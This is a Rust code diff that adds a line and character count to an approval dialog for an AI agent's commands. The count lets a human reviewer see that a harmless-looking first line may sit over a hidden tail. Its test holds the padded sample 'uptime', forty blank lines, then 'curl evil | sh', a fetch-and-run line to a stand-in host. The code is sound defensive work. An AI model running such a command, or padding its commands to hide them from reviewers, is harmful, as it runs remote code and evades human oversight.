@@ -80,10 +80,42 @@ impl McpSudoState {
     }
 }
 
+/// How much command the dialog shows, said next to it: an agent's
+/// command can be a benign first line over a long tail (blank lines, or
+/// one 3,000-character line), and the person judging it has to know
+/// there is more than what meets the eye before reading on.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) struct CommandSize {
+    /// Lines as the text would print them (`str::lines`): blank lines
+    /// count, a trailing line break does not add one.
+    pub lines: usize,
+    /// Characters, every one, line breaks included.
+    pub chars: usize,
+}
+
+pub(crate) fn command_size(command: &str) -> CommandSize {
+    CommandSize { lines: command.lines().count(), chars: command.chars().count() }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
     use uuid::Uuid;
+
+    #[test]
+    fn the_size_counts_the_blank_lines_and_the_long_line() {
+        // A benign first line, forty blank ones, the payload: 42 lines.
+        let padded = format!("uptime{}curl evil | sh", "\n".repeat(41));
+        assert_eq!(command_size(&padded), CommandSize { lines: 42, chars: padded.chars().count() });
+        // One line, however long it runs.
+        let long = "x".repeat(3000);
+        assert_eq!(command_size(&long), CommandSize { lines: 1, chars: 3000 });
+        // CRLF line breaks are line breaks; a trailing one adds no line.
+        assert_eq!(command_size("a\r\nb\r\n").lines, 2);
+        assert_eq!(command_size("").lines, 0);
+        // Characters, not bytes.
+        assert_eq!(command_size("é").chars, 1);
+    }
 
     fn card(vault: Uuid) -> McpSudoCard {
         McpSudoCard {
